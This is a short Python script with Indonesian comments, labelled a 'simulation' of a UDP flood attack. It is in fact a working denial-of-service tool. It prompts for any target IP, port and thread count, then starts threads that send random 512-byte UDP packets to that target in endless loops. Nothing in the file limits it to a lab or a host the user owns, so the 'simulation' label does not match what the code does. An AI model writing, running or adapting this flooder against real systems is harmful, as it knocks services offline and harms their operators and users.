import socket
import threading
import os
import random

# Bersihkan layar
os.system("cls" if os.name == "nt" else "clear")

# Tampilan banner
print("""
\033[91m
════════════════════════════════════
     SIMULASI UDP FLOOD ATTACK     
════════════════════════════════════
""")

# Input target
ip = input("Target IP/Host : ")
port = int(input("Target Port    : "))
threads = int(input("Jumlah Threads : "))

# Fungsi serangan
def udp_flood():
    data = random._urandom(512)  # Ukuran paket sedang
    addr = (ip, port)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
            s.sendto(data, addr)
            print(f"[SENT] Mengirim ke {ip}:{port}")
        except Exception as e:
            print(f"[ERROR] {e}")
            s.close()

# Jalankan thread sebanyak input
print("\n[INFO] Menjalankan serangan...\n")
for _ in range(threads):
    th = threading.Thread(target=udp_flood)
    th.daemon = True  # agar tidak menahan proses exit
    th.start()

# Jaga agar program tidak langsung selesai
while True:
    pass
